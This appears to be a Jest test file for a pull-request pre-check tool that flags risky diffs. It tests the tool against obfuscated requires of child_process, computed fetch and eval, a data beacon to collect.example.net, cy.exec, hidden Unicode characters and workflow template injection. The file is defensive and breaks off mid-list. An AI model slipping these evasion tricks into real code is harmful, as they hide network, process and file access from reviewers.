/**
 * @jest-environment node
 */
const fs = require('fs');
const os = require('os');
const path = require('path');
const { preCheck, formatReport, main } = require('./pr-pre-check');

const SOURCE = 'src/models/sample.js';

// The diff of one new file with these lines, as `git diff` writes it.
function newFile(filePath, lines, { mode = '100644', end = '\n' } = {}) {
  const body = lines.map((line) => `+${line}${end}`).join('');
  return [
    `diff --git a/${filePath} b/${filePath}${end}`,
    `new file mode ${mode}${end}`,
    `index 0000000..1111111${end}`,
    `--- /dev/null${end}`,
    `+++ b/${filePath}${end}`,
    `@@ -0,0 +1,${lines.length} @@${end}`,
    body,
  ].join('');
}

// Each finding as one text: the rule, and its detail in brackets.
function labels(diff, inputs) {
  return preCheck(diff, inputs).findings.map((item) =>
    item.detail ? `${item.rule} (${item.detail})` : item.rule,
  );
}

// Check that each wanted text is part of a finding and that no unwanted text is.
function expectFindings(diff, wanted, unwanted = [], inputs = undefined) {
  const found = labels(diff, inputs);
  wanted.forEach((text) => {
    expect(found).toEqual(
      expect.arrayContaining([expect.stringContaining(text)]),
    );
  });
  unwanted.forEach((text) => {
    expect(found).not.toEqual(
      expect.arrayContaining([expect.stringContaining(text)]),
    );
  });
  expect(found.length > 0).toBe(wanted.length > 0);
}

describe('file rules', () => {
  const svg = '<svg xmlns="http://www.w3.org/2000/svg">';
  const binary =
    'diff --git a/src/a.wasm b/src/a.wasm\nnew file mode 100644\nBinary files /dev/null and b/src/a.wasm differ\n';

  it.each([
    [
      'ESLint config in src',
      'src/.eslintrc.js',
      ['module.exports = { rules: {} };'],
      ['dotfile or dot folder'],
    ],
    [
      'ESLint JSON config in the tests',
      'cypress/tests/.eslintrc.json',
      ['{ "root": true }'],
      ['dotfile'],
    ],
    [
      'Babel config in src',
      'src/.babelrc.js',
      ['module.exports = {};'],
      ['dotfile or dot folder'],
    ],
    [
      'nested package.json',
      'src/package.json',
      ['{ "type": "commonjs" }'],
      ['package file'],
    ],
    [
      'nested config file',
      'src/jest.config.js',
      ['module.exports = {};'],
      ['config file'],
    ],
    [
      'Jest snapshot',
      'src/models/__snapshots__/sample.test.js.snap',
      ['exports[`a 1`] = `x`;'],
      ['Jest snapshot', 'file type that the check does not know'],
    ],
    [
      'Jest mock folder',
      'src/__mocks__/axios.js',
      ['module.exports = {};'],
      ['Jest mock folder'],
    ],
    [
      'code fixture',
      'cypress/fixtures/sample.js',
      ['({ a: 1 })'],
      ['code file in cypress/fixtures'],
    ],
    [
      'JSON fixture (good)',
      'cypress/fixtures/sample.json',
      ['{ "name": "x" }'],
      [],
    ],
    [
      'HTML page in public',
      'public/sample.html',
      ['<p>x</p>'],
      ['file type that the check does not know'],
    ],
    [
      'TypeScript file in src',
      'src/models/sample.ts',
      ['export const a = 1;'],
      ['file type'],
    ],
    [
      'file with no type',
      'src/models/Makefile',
      ['all:'],
      ['file type that the check does not know'],
    ],
    [
      'SVG with a script',
      'public/a.svg',
      [`${svg}<script>top.x()</script></svg>`],
      ['script or event'],
    ],
    [
      'SVG with an event handler',
      'public/a.svg',
      [`${svg}<g onload="x()"/></svg>`],
      ['script or event'],
    ],
    [
      'SVG picture (good)',
      'public/a.svg',
      [`${svg}<path d="M0 0h4v4z"/></svg>`],
      [],
    ],
    [
      'root package.json (control)',
      'package.json',
      ['    "preinstall": "node x.js",'],
      ['file outside', 'package file'],
    ],
    [
      'workflow file (control)',
      '.github/workflows/ci.yml',
      ['        run: npm test'],
      ['file outside'],
    ],
  ])('%s', (name, filePath, lines, wanted) => {
    expectFindings(newFile(filePath, lines), wanted);
  });

  it.each([
    ['submodule entry', 'src/vendor', ['Subproject commit 0123456'], '160000'],
    ['symbolic link', 'src/link.js', ['../package.json'], '120000'],
    ['executable file', 'src/models/run.js', ['export const a = 1;'], '100755'],
  ])('%s', (name, filePath, lines, mode) => {
    expectFindings(newFile(filePath, lines, { mode }), [name]);
  });

  it('reports a binary file, and not its file type', () => {
    expectFindings(
      binary,
      ['binary file'],
      ['file type that the check does not know'],
    );
  });
});

describe('diff reader', () => {
  const shell = "require('child_process');";
  const workflow = `.github/workflows/${String.fromCodePoint(0xe9)}.yml`;
  const workflowQuoted = '.github/workflows/\\303\\251.yml';

  it('reads a quoted path of a second file', () => {
    const quoted = [
      `diff --git "a/${workflowQuoted}" "b/${workflowQuoted}"`,
      'new file mode 100644',
      'index 0000000..1111111',
      '--- /dev/null',
      `+++ "b/${workflowQuoted}"`,
      '@@ -0,0 +1,1 @@',
      '+on: pull_request',
      '',
    ].join('\n');
    const result = preCheck(
      newFile(SOURCE, ['export const size = 4;']) + quoted,
    );
    expect(result.findings).toContainEqual(
      expect.objectContaining({
        rule: 'file outside the usual folders (it can run in CI)',
        file: workflow,
      }),
    );
    expectFindings(newFile(SOURCE, ['export const a = 1;']) + quoted, [
      'control or non-ASCII character in the path',
    ]);
  });

  it("reads a path that holds ' b/'", () => {
    const result = preCheck(
      newFile('cypress/support b/src/sample.js', ['export const a = 1;']),
    );
    expect(result.findings).toContainEqual(
      expect.objectContaining({
        rule: 'file outside the usual folders (it can run in CI)',
        file: 'cypress/support b/src/sample.js',
      }),
    );
  });

  it('reads an added line that looks like a path line as an added line', () => {
    const diff = newFile(SOURCE, ['++ b/README.md', shell]);
    expect(preCheck(diff).findings).toContainEqual(
      expect.objectContaining({ detail: 'require', line: 2 }),
    );
    expectFindings(diff, ['require'], ['do not agree']);
  });

  it('reads code that the parser cannot read with the text rules', () => {
    const diff = newFile(SOURCE, ['const = ;', shell]);
    expect(preCheck(diff).findings).toContainEqual(
      expect.objectContaining({ rule: 'process or shell', line: 2 }),
    );
    expectFindings(diff, ['code that the parser cannot read']);
  });

  it('reports an added line after the end of a hunk', () => {
    expectFindings(`${newFile(SOURCE, ['export const a = 1;'])}+${shell}\n`, [
      'diff line that the check cannot read',
    ]);
  });

  it('reports a rename to a config file with its old path', () => {
    const rename = [
      'diff --git a/src/models/a.js b/.eslintrc.js',
      'similarity index 100%',
      'rename from src/models/a.js',
      'rename to .eslintrc.js',
      '',
    ].join('\n');
    const result = preCheck(rename);
    expect(result.findings).toContainEqual(
      expect.objectContaining({
        rule: 'file outside the usual folders (it can run in CI)',
        file: '.eslintrc.js',
      }),
    );
    expectFindings(rename, ['renamed file (from src/models/a.js)']);
  });

  it.each([
    [
      'two paths that are not equal, and no rename line',
      'diff --git a/src/a.js b/src/b.js\n',
      'path that the check cannot read',
    ],
    [
      'path lines that do not agree',
      newFile(SOURCE, ['x']).replace(`+++ b/${SOURCE}`, '+++ b/src/other.js'),
      'do not agree',
    ],
    ['text that is not a diff', 'hello\n', 'no file in the diff'],
  ])('reports %s', (name, diff, wanted) => {
    expectFindings(diff, [wanted]);
  });

  it('reports more than 15 files and more than 400 added lines', () => {
    const many = Array.from({ length: 16 }, (unused, index) =>
      newFile(`src/models/file${index}.js`, ['export const a = 1;']),
    ).join('');
    const long = newFile(
      SOURCE,
      Array.from(
        { length: 401 },
        (unused, index) => `export const a${index} = 1;`,
      ),
    );
    expectFindings(many, ['more than 15 files (16 files)']);
    expectFindings(long, ['more than 400 added lines (401 lines)']);
  });
});

describe('character rules', () => {
  const shell = "require('child_process');";
  const char = (code) => String.fromCodePoint(code);

  // Characters that JavaScript or another tool reads as a line end or as white
  // space. The text after them must stay visible in the finding.
  it.each(['000D', '000B', '000C', '001C', '0085', '2028', '2029'])(
    'shows the text after U+%s',
    (hex) => {
      const code = parseInt(hex, 16);
      const result = preCheck(
        newFile(SOURCE, [`// note${char(code)}${shell}`]),
      );
      expect(result.findings).toContainEqual(
        expect.objectContaining({
          rule: 'control or invisible character',
          detail: `U+${hex}`,
          line: 1,
          text: expect.stringContaining(shell),
        }),
      );
    },
  );

  it('reads code after a line separator as code on the same diff line', () => {
    const line = `const a = 1;${char(0x2028)}fetch('/api/x');`;
    const result = preCheck(newFile(SOURCE, ['export const b = 2;', line]));
    expect(result.findings).toContainEqual(
      expect.objectContaining({ detail: 'fetch', line: 2 }),
    );
  });

  it.each([
    [
      'zero width space',
      `const a${char(0x200b)} = 1;`,
      'invisible character (U+200B)',
    ],
    [
      'bidi override',
      `const a = 'x${char(0x202e)}';`,
      'invisible character (U+202E)',
    ],
    [
      'word joiner',
      `const a = 'x${char(0x2060)}';`,
      'invisible character (U+2060)',
    ],
    [
      'tag character',
      `const a = 'x${char(0xe0061)}';`,
      'invisible character (U+E0061)',
    ],
    ['private use character', `const a = 'x${char(0xe000)}';`, '(U+E000)'],
    [
      'Hangul filler as a name',
      `const { a, ${char(0x3164)} } = q;`,
      'non-ASCII character in a code file (U+3164)',
    ],
    [
      'Cyrillic letter in a name',
      `const ${char(0x430)} = 1;`,
      'non-ASCII character in a code file (U+0430)',
    ],
    [
      'no-break space in code',
      `const${char(0xa0)}a = 1;`,
      'non-ASCII character in a code file (U+00A0)',
    ],
    [
      'bytes that are not UTF-8 text',
      `const a = '${char(0xfffd)}';`,
      'non-ASCII character in a code file (U+FFFD)',
    ],
  ])('reports a %s', (name, line, wanted) => {
    expectFindings(newFile(SOURCE, [line]), [wanted]);
  });

  it('reports an invisible character in a prose file', () => {
    expectFindings(newFile('README.md', [`A${char(0x200b)}B`]), ['(U+200B)']);
  });

  it('gives CLEAN for a letter with an accent in a prose file', () => {
    expectFindings(newFile('README.md', [`Caf${char(0xe9)} and trees`]), []);
  });

  it('gives CLEAN for a good change with CRLF line ends', () => {
    const diff = newFile(SOURCE, ['export const size = 4;', '// two'], {
      end: '\r\n',
    });
    expectFindings(diff, []);
  });
});

describe('code rules', () => {
  const TEST = 'src/models/sample.test.js';
  const CY = 'cypress/tests/integration/sample.cy.js';
  const GLOBAL = 'global name that the check does not allow';
  const ROOT = 'use of a root object that the check does not allow';
  const IMPORT = 'import of a package that the check does not allow';
  const MODULE = 'Node.js module name in a string';
  const HOST = 'URL of another host';
  const bs = '\\';

  it.each([
    [
      'module name from 2 strings',
      TEST,
      ["const m = require('child_' + 'process');"],
      [`${GLOBAL} (require)`, 'string joined from constants'],
    ],
    [
      'module name with join',
      TEST,
      ["const m = require(['child', 'process'].join('_'));"],
      [`${GLOBAL} (require)`],
    ],
    [
      'dynamic import with concat',
      TEST,
      ["const m = await import('f' + 's');"],
      ['dynamic import'],
    ],
    [
      'template literal name',
      TEST,
      ['const m = require(`child_process`);'],
      [`${MODULE} (child_process)`],
    ],
    [
      'require split over 2 lines',
      TEST,
      ['const m = require(', "  'fs'", ');'],
      [`${MODULE} (fs)`],
    ],
    [
      'import with from at the line end',
      TEST,
      ['import { readFileSync } from', "  'fs';"],
      [`${IMPORT} (fs)`],
    ],
    [
      'string line continuation',
      TEST,
      [`const n = 'child_${bs}`, "process';"],
      ['escaped characters in a string'],
    ],
    [
      'require.call',
      TEST,
      ["const m = require.call(null, 'fs');"],
      [`${GLOBAL} (require)`],
    ],
    [
      'jest.requireActual with concat',
      TEST,
      ["const m = jest.requireActual('o' + 's');"],
      [`${ROOT} (jest.requireActual)`],
    ],
    [
      'wrapper package for files',
      TEST,
      ["import g from 'graceful-fs';"],
      [`${IMPORT} (graceful-fs)`],
    ],
    [
      'request package',
      TEST,
      ["import f from 'cross-fetch';"],
      [`${IMPORT} (cross-fetch)`],
    ],
    [
      'Node.js module not in an old list',
      TEST,
      ["const { WASI } = require('wasi');"],
      [`${MODULE} (wasi)`],
    ],
    [
      'computed member of process',
      SOURCE,
      ["const e = process['env'];"],
      [`${ROOT} (process)`],
    ],
    [
      'optional chain on process',
      SOURCE,
      ['const e = process?.env;'],
      [`${ROOT} (process)`],
    ],
    [
      'destructure process',
      SOURCE,
      ['const { env, binding } = process;'],
      [`${ROOT} (process)`],
    ],
    [
      'alias of process',
      SOURCE,
      ['const p = process;', 'const e = p.env;'],
      [`${ROOT} (process)`],
    ],
    [
      'member on the next line',
      SOURCE,
      ['const e = process', '  .env;'],
      [`${ROOT} (process.env)`],
    ],
    [
      'Reflect.get',
      SOURCE,
      ["const e = Reflect.get(process, 'env');"],
      [`${GLOBAL} (Reflect)`],
    ],
    [
      'computed fetch on window',
      SOURCE,
      ["window['fe' + 'tch'](u);"],
      [`${ROOT} (window)`],
    ],
    [
      'computed fetch on self',
      SOURCE,
      ["self['fet' + 'ch'](u);"],
      [`${GLOBAL} (self)`],
    ],
    ['plain fetch', SOURCE, ["fetch('/api/x');"], [`${GLOBAL} (fetch)`]],
    [
      'computed sendBeacon',
      SOURCE,
      ["navigator['send' + 'Beacon'](u, d);"],
      [`${ROOT} (navigator)`],
    ],
    [
      'image request with a protocol-relative URL',
      SOURCE,
      ["new Image().src = '//collect.example.net/p?d=' + d;"],
      [`${HOST} (collect.example.net)`],
    ],
    ['computed cy command', CY, ["cy['exec']('id');"], [`${ROOT} (cy)`]],
    ['cy.exec', CY, ["cy.exec('id');"], [`${ROOT} (cy.exec)`]],
    ['cy command by name', CY, ["cy.now('exec', 'id');"], [`${ROOT} (cy.now)`]],
    [
      'cy command through invoke',
      CY,
      ["cy.wrap(cy).invoke('exec', 'id');"],
      [`${ROOT} (cy)`],
    ],
    ['direct eval', SOURCE, ['eval(code);'], [`${GLOBAL} (eval)`]],
    ['indirect eval', SOURCE, ['(0, eval)(code);'], [`${GLOBAL} (eval)`]],
    [
      'Function as a template tag',
      SOURCE,
      ['const f = Function`return process`;'],
      [`${GLOBAL} (Function)`],
    ],
    [
      'computed constructor chain',
      SOURCE,
      ["const f = []['constructor']['constructor'](code);"],
      ['constructor chain'],
    ],
    [
      'constructor chain with dots',
      SOURCE,
      ['const f = [].constructor.constructor(code);'],
      ['constructor chain'],
    ],
    [
      'script element',
      SOURCE,
      ["const s = document.createElement('script');"],
      ['element that can run code (script)'],
    ],
    [
      'Worker from a blob',
      SOURCE,
      ['new Worker(URL.createObjectURL(new Blob([code])));'],
      [`${GLOBAL} (Worker)`],
    ],
    [
      'dynamic import of a literal path',
      SOURCE,
      ["const m = await import('../../scripts/baseline.js');"],
      ['dynamic import'],
    ],
    [
      'unicode escape in a string',
      TEST,
      [`const m = require('child${bs}u005fprocess');`],
      ['escaped characters in a string', `${MODULE} (child_process)`],
    ],
    [
      'hex escape in a string',
      TEST,
      [`const m = require('child${bs}x5fprocess');`],
      ['escaped characters in a string'],
    ],
    [
      'octal escape in a string',
      TEST,
      [`const m = require('child${bs}137process');`],
      ['code that the parser cannot read'],
    ],
    [
      'unescape',
      TEST,
      ["const m = require(unescape('%66s'));"],
      [`${GLOBAL} (unescape)`],
    ],
    [
      'TextDecoder on bytes',
      TEST,
      ['const n = new TextDecoder().decode(new Uint8Array([102, 115]));'],
      [`${GLOBAL} (TextDecoder)`],
    ],
    ['atob', TEST, ["const n = atob('ZnM=');"], [`${GLOBAL} (atob)`]],
    [
      'unicode escape in a name',
      SOURCE,
      [`const e = proc${bs}u0065ss.env;`],
      ['escaped characters in a name', `${ROOT} (process.env)`],
    ],
    [
      'unknown host',
      SOURCE,
      ["const u = 'https://collect.example.net/x';"],
      [`${HOST} (collect.example.net)`],
    ],
    [
      'known host as userinfo',
      SOURCE,
      ["const u = 'https://treetracker.org@collect.example.net/x';"],
      [`${HOST} (collect.example.net)`],
    ],
    [
      'known host as a prefix label',
      SOURCE,
      ["const u = 'https://treetracker.org.example.net/x';"],
      [`${HOST} (treetracker.org.example.net)`],
    ],
    [
      'scheme from 2 strings',
      SOURCE,
      ["const u = 'ht' + 'tps:/' + '/collect.example.net/x';"],
      [`${HOST} (collect.example.net)`],
    ],
    [
      'IPv6 literal',
      SOURCE,
      ["const u = 'http://[2001:db8::1]/x';"],
      [`${HOST} ([2001:db8::1])`],
    ],
    [
      'decimal IP address',
      SOURCE,
      ["const u = 'http://3232235777/x';"],
      [`${HOST} (192.168.1.1)`],
    ],
    [
      'websocket scheme',
      SOURCE,
      ["const u = 'wss://collect.example.net/x';"],
      [`${HOST} (collect.example.net)`],
    ],
  ])('reports a %s', (name, filePath, lines, wanted) => {
    expectFindings(newFile(filePath, lines), wanted);
  });

  it.each([
    [
      'a good change with a known URL in a comment',
      SOURCE,
      ['export const size = 4;', '// see https://map.treetracker.org'],
    ],
    [
      'a named environment value',
      SOURCE,
      ['export const api = process.env.NEXT_PUBLIC_API;'],
    ],
    [
      'a plain member of window',
      SOURCE,
      ['export const here = () => window.location.href;'],
    ],
    [
      'a URL of a known host',
      SOURCE,
      ["export const u = 'https://map.treetracker.org/x';"],
    ],
    [
      'a URL in a prose file',
      'README.md',
      ['See https://collect.example.net for more.'],
    ],
    [
      'an import of a package of the repo',
      SOURCE,
      ["import React from 'react';", 'export default React;'],
    ],
    [
      'an import of a folder of src',
      SOURCE,
      [
        "import log from 'loglevel';",
        "import api from 'models/api';",
        'export default [log, api];',
      ],
    ],
    [
      'a relative import',
      SOURCE,
      ["import other from './other';", 'export default other;'],
    ],
    [
      'a cy command',
      CY,
      ["cy.visit('/');", "cy.contains('Trees').should('be.visible');"],
    ],
    [
      'a JSX element',
      'src/components/Sample.js',
      [
        'export default function Sample() {',
        '  return <div className="a">x</div>;',
        '}',
      ],
    ],
  ])('gives CLEAN for %s', (name, filePath, lines) => {
    expectFindings(newFile(filePath, lines), []);
  });
});

describe('URL, address and length rules', () => {
  it.each([
    [
      'a URL of another host in a JSON fixture',
      'cypress/fixtures/a.json',
      ['{ "src": "https://collect.example.net/a.png" }'],
      ['URL of another host (collect.example.net)'],
    ],
    [
      'a URL of another host in a style file',
      'src/style2.css',
      ['a { background: url(https://collect.example.net/a.png); }'],
      ['URL of another host (collect.example.net)'],
    ],
    [
      'an IP address',
      'cypress/fixtures/a.json',
      ['{ "host": "10.1.2.3" }'],
      ['IP address'],
    ],
    [
      'a long line of code',
      SOURCE,
      [`export const a = '${'x'.repeat(290)}';`],
      ['line longer than 300 characters'],
    ],
  ])('reports %s', (name, filePath, lines, wanted) => {
    expectFindings(newFile(filePath, lines), wanted);
  });

  it.each([
    [
      'a known host in a JSON fixture',
      'cypress/fixtures/a.json',
      ['{ "src": "https://dev-k8s.treetracker.org/a.png" }'],
    ],
    [
      'the local address',
      'cypress/fixtures/a.json',
      ['{ "host": "127.0.0.1" }'],
    ],
    [
      'a version number',
      'cypress/fixtures/a.json',
      ['{ "version": "2.10.14" }'],
    ],
  ])('gives CLEAN for %s', (name, filePath, lines) => {
    expectFindings(newFile(filePath, lines), []);
  });
});

describe('inputs of the caller', () => {
  // The diff of a changed file: 2 old lines, then 1 added line.
  const changed = [
    `diff --git a/${SOURCE} b/${SOURCE}`,
    'index 1111111..2222222 100644',
    `--- a/${SOURCE}`,
    `+++ b/${SOURCE}`,
    '@@ -1,2 +1,3 @@',
    " const old = require('child_process');",
    ' export const a = 1;',
    "+fetch('/api/x');",
    '',
  ].join('\n');
  const newText = [
    "const old = require('child_process');",
    'export const a = 1;',
    "fetch('/api/x');",
  ].join('\n');

  it('reports a file that GitHub lists and the diff does not show', () => {
    const diff = newFile(SOURCE, ['export const a = 1;']);
    const result = preCheck(diff, { files: [SOURCE, 'package.json'] });
    expect(result.findings).toContainEqual(
      expect.objectContaining({
        rule: 'file that the diff does not show',
        file: 'package.json',
      }),
    );
    expectFindings(diff, ['package file'], [], {
      files: [SOURCE, 'package.json'],
    });
  });

  it('reports a file of the diff that GitHub does not list', () => {
    const diff = newFile(SOURCE, ['export const a = 1;']);
    expectFindings(diff, ['file of the diff that GitHub does not list'], [], {
      files: [],
    });
  });

  it('reads the whole new file of a changed file and reports only added lines', () => {
    const readNewFile = (file) => (file === SOURCE ? newText : null);
    const result = preCheck(changed, { readNewFile });
    expect(result.findings).toEqual([
      expect.objectContaining({ detail: 'fetch', line: 3 }),
    ]);
  });

  it('reports a changed code file whose new text it cannot read', () => {
    expectFindings(changed, ['code file that the check cannot read whole']);
  });

  it('reports a new text that does not match the diff', () => {
    const readNewFile = () => newText.replace("fetch('/api/x');", 'x();');
    expectFindings(
      changed,
      ['new file text that does not match the diff'],
      [],
      {
        readNewFile,
      },
    );
  });
});

describe('zizmor step', () => {
  const WORKFLOW = '.github/workflows/ci.yml';
  const oldText = ['on: pull_request_target', 'jobs: {}'].join('\n');
  const newText = [
    'on: pull_request_target',
    'jobs:',
    '  a:',
    '    steps:',
    `      - run: echo "\${{ github.event.pull_request.title }}"`,
  ].join('\n');
  const changed = [
    `diff --git a/${WORKFLOW} b/${WORKFLOW}`,
    'index 1111111..2222222 100644',
    `--- a/${WORKFLOW}`,
    `+++ b/${WORKFLOW}`,
    '@@ -1,2 +1,5 @@',
    ' on: pull_request_target',
    '-jobs: {}',
    ...newText
      .split('\n')
      .slice(1)
      .map((line) => `+${line}`),
    '',
  ].join('\n');
  const files = { old: { [WORKFLOW]: oldText }, new: { [WORKFLOW]: newText } };
  const inputs = (zizmor) => ({
    readOldFile: (file) => files.old[file] ?? null,
    readNewFile: (file) => files.new[file] ?? null,
    zizmor,
  });

  // A fake zizmor: one finding for each line with a known weak point.
  function fakeZizmor(text) {
    return text.split('\n').flatMap((line, index) => {
      if (line.includes('pull_request_target')) {
        return [
          {
            id: 'dangerous-triggers',
            line: index + 1,
            message: 'insecure trigger',
          },
        ];
      }
      if (line.includes('${{ github.event')) {
        return [
          {
            id: 'template-injection',
            line: index + 1,
            message: 'code injection',
          },
        ];
      }
      return [];
    });
  }

  it('shows only the zizmor findings that the old file does not have', () => {
    const result = preCheck(changed, inputs(fakeZizmor));
    const zizmor = result.findings.filter(
      (item) => item.rule === 'workflow finding of zizmor',
    );
    expect(zizmor).toEqual([
      expect.objectContaining({
        detail: 'template-injection: code injection',
        file: WORKFLOW,
        line: 5,
      }),
    ]);
  });

  it('keeps a workflow change on REVIEW when zizmor finds nothing new', () => {
    const result = preCheck(
      changed,
      inputs(() => []),
    );
    expect(result.verdict).toBe('review');
    expectFindings(
      changed,
      ['file outside the usual folders'],
      ['zizmor'],
      inputs(() => []),
    );
  });

  it('says that zizmor did not run when the caller has no zizmor', () => {
    expectFindings(
      changed,
      ['zizmor not run'],
      [],
      inputs(() => null),
    );
    expectFindings(changed, ['zizmor not run'], [], inputs(undefined));
  });

  it('reads a new workflow file from the diff', () => {
    const diff = newFile(WORKFLOW, newText.split('\n'));
    const found = preCheck(diff, { zizmor: fakeZizmor }).findings;
    expect(
      found.filter((item) => item.rule === 'workflow finding of zizmor'),
    ).toHaveLength(2);
  });
});

describe('command line', () => {
  const folders = [];
  afterEach(() => {
    folders
      .splice(0)
      .forEach((folder) => fs.rmSync(folder, { recursive: true, force: true }));
  });

  function diffFile(text) {
    const folder = fs.mkdtempSync(path.join(os.tmpdir(), 'pr-pre-check-test-'));
    folders.push(folder);
    const file = path.join(folder, 'pr.diff');
    fs.writeFileSync(file, text);
    return file;
  }

  it('gives exit code 0 for CLEAN and 1 for REVIEW, with the report', () => {
    expect(
      main(['--diff', diffFile(newFile(SOURCE, ['export const a = 1;']))]),
    ).toEqual({
      exitCode: 0,
      output: 'CLEAN',
    });
    const review = main([
      '--diff',
      diffFile(newFile(SOURCE, ["fetch('/x');"])),
    ]);
    expect(review.exitCode).toBe(1);
    expect(review.output.split('\n')[0]).toBe('REVIEW: 1 finding in 1 file');
  });

  it('gives exit code 2 and the usage text for wrong arguments', () => {
    [
      [],
      ['--diff'],
      ['--other', 'x'],
      ['--diff', '/no/such/file.diff'],
    ].forEach((args) => {
      const result = main(args);
      expect(result.exitCode).toBe(2);
      expect(result.output).toContain('Usage:');
    });
  });
});

describe('report', () => {
  const report = (diff) => formatReport(preCheck(diff));

  it('is one line CLEAN for a clean result', () => {
    expect(report(newFile(SOURCE, ['export const a = 1;']))).toBe('CLEAN');
  });

  it('starts with the count of findings and files', () => {
    const diff =
      newFile(SOURCE, ["fetch('/api/x');"]) +
      newFile('src/models/b.js', ['eval(1);', "fetch('/b');"]);
    expect(report(diff).split('\n')[0]).toBe('REVIEW: 3 findings in 2 files');
    expect(report(newFile(SOURCE, ['eval(1);'])).split('\n')[0]).toBe(
      'REVIEW: 1 finding in 1 file',
    );
  });

  it('shows the place, the rule, the reason and the line of a finding', () => {
    const text = report(
      newFile(SOURCE, ['export const a = 1;', "fetch('/api/x');"]),
    );
    expect(text.split('\n')).toEqual([
      'REVIEW: 1 finding in 1 file',
      `- ${SOURCE}:2: global name that the check does not allow (fetch)`,
      '  Why: This global name can give access to the network, programs or code from text.',
      "  Line: fetch('/api/x');",
    ]);
  });

  it('shows a file finding and a diff finding without a line', () => {
    const text = report('hello\n');
    expect(text).toContain('- diff: no file in the diff');
    const file = report(newFile('src/package.json', ['{}']));
    expect(file).toContain(
      '- src/package.json: package file (npm and Node.js read it)',
    );
  });

  it('writes only printable ASCII, also for a line with hidden characters', () => {
    const line = `const a = 'x${String.fromCodePoint(0x202e)}';`;
    const text = report(newFile(SOURCE, [line]));
    expect(text).toContain("  Line: const a = 'x<U+202E>';");
    expect(/^[\n -~]*$/.test(text)).toBe(true);
  });
});

describe('samples of the research', () => {
  // Tricks that hide a request, a process, a file access or code from text,
  // the controls for them, and files that a tool loads. Each sample gives
  // REVIEW, and each finding has its reason sentence.
  const SAMPLES = [
    [
      's001',
      'module name from 2 strings',
      'src/models/sample.test.js',
      '100644',
      ["const m = require('child_' + 'process');"],
    ],
    [
      's002',
      'module name with join',
      'src/models/sample.test.js',
      '100644',
      ["const m = require(['child', 'process'].join('_'));"],
    ],
    [
      's003',
      'module name in a variable (control)',
      'src/models/sample.test.js',
      '100644',
      ['const m = require(name);'],
    ],
    [
      's004',
      'dynamic import with concat',
      'src/models/sample.test.js',
      '100644',
      ["const m = await import('f' + 's');"],
    ],
    [
      's005',
      'template literal name (control)',
      'src/models/sample.test.js',
      '100644',
      ['const m = require(`child_process`);'],
    ],
    [
      's006',
      'require split over 2 lines',
      'src/models/sample.test.js',
      '100644',
      ['const m = require(', "  'fs'", ');'],
    ],
    [
      's007',
      'import with `from` at the line end',
      'src/models/sample.test.js',
      '100644',
      ['import { readFileSync } from', "  'fs';"],
    ],
    [
      's008',
      'string line continuation',
      'src/models/sample.test.js',
      '100644',
      ["const n = 'child_\\", "process';", 'const m = require(n);'],
    ],
    [
      's009',
      'require.call',
      'src/models/sample.test.js',
      '100644',
      ["const m = require.call(null, 'fs');"],
    ],
    [
      's010',
      'jest.requireActual with concat',
      'src/models/sample.test.js',
      '100644',
      ["const m = jest.requireActual('o' + 's');"],
    ],
    [
      's011',
      'wrapper package for files',
      'src/models/sample.test.js',
      '100644',
      ["const f = require('fs-extra');"],
    ],
    [
      's012',
      'wrapper package for files 2',
      'src/models/sample.test.js',
      '100644',
      ["import g from 'graceful-fs';"],
    ],
    [
      's013',
      'subpath of a process package',
      'src/models/sample.test.js',
      '100644',
      ["const s = require('cross-spawn/index.js');"],
    ],
    [
      's014',
      'process package, exact name (control)',
      'src/models/sample.test.js',
      '100644',
      ["const s = require('cross-spawn');"],
    ],
    [
      's015',
      'request package not in the list',
      'src/models/sample.test.js',
      '100644',
      ["import f from 'cross-fetch';"],
    ],
    [
      's016',
      'Node.js module not in the list',
      'src/models/sample.test.js',
      '100644',
      ["const { WASI } = require('wasi');"],
    ],
    [
      's017',
      'computed member of process',
      'src/models/sample.js',
      '100644',
      ["const e = process['env'];"],
    ],
    [
      's018',
      'optional chain on process',
      'src/models/sample.js',
      '100644',
      ['const e = process?.env;'],
    ],
    [
      's019',
      'destructure process',
      'src/models/sample.js',
      '100644',
      ['const { env, binding } = process;'],
    ],
    [
      's020',
      'alias of process',
      'src/models/sample.js',
      '100644',
      ['const p = process;', 'const e = p.env;'],
    ],
    [
      's021',
      'member on the next line',
      'src/models/sample.js',
      '100644',
      ['const e = process', '  .env;'],
    ],
    [
      's022',
      'Reflect.get',
      'src/models/sample.js',
      '100644',
      ["const e = Reflect.get(process, 'env');"],
    ],
    [
      's023',
      'computed fetch on window',
      'src/models/sample.js',
      '100644',
      ["window['fe' + 'tch'](u);"],
    ],
    [
      's024',
      'computed fetch on self',
      'src/models/sample.js',
      '100644',
      ["self['fet' + 'ch'](u);"],
    ],
    [
      's025',
      'plain fetch (control)',
      'src/models/sample.js',
      '100644',
      ["fetch('/api/x');"],
    ],
    [
      's026',
      'computed sendBeacon',
      'src/models/sample.js',
      '100644',
      ["navigator['send' + 'Beacon'](u, d);"],
    ],
    [
      's027',
      'image request, protocol-relative URL',
      'src/models/sample.js',
      '100644',
      ["new Image().src = '//collect.example.net/p?d=' + d;"],
    ],
    [
      's028',
      'computed cy command',
      'cypress/tests/integration/sample.cy.js',
      '100644',
      ["cy['exec']('id');"],
    ],
    [
      's029',
      'cy.exec (control)',
      'cypress/tests/integration/sample.cy.js',
      '100644',
      ["cy.exec('id');"],
    ],
    [
      's030',
      'cy command by name (cy.now)',
      'cypress/tests/integration/sample.cy.js',
      '100644',
      ["cy.now('exec', 'id');"],
    ],
    [
      's031',
      'cy command through invoke',
      'cypress/tests/integration/sample.cy.js',
      '100644',
      ["cy.wrap(cy).invoke('exec', 'id');"],
    ],
    [
      's032',
      'computed cy.request',
      'cypress/tests/integration/sample.cy.js',
      '100644',
      ["cy['request'](u);"],
    ],
    [
      's033',
      'aliased fs object',
      'src/models/sample.test.js',
      '100644',
      ["f.readFileSync('/etc/hostname', 'utf8');"],
    ],
    [
      's034',
      'direct eval (control)',
      'src/models/sample.js',
      '100644',
      ['eval(code);'],
    ],
    [
      's035',
      'indirect eval (0, eval)',
      'src/models/sample.js',
      '100644',
      ['(0, eval)(code);'],
    ],
    [
      's036',
      'eval alias',
      'src/models/sample.js',
      '100644',
      ['const run = eval;', 'run(code);'],
    ],
    [
      's037',
      'computed eval on window',
      'src/models/sample.js',
      '100644',
      ["window['ev' + 'al'](code);"],
    ],
    [
      's038',
      'Function as a template tag',
      'src/models/sample.js',
      '100644',
      ['const f = Function`return process`;'],
    ],
    [
      's039',
      'Reflect.construct(Function)',
      'src/models/sample.js',
      '100644',
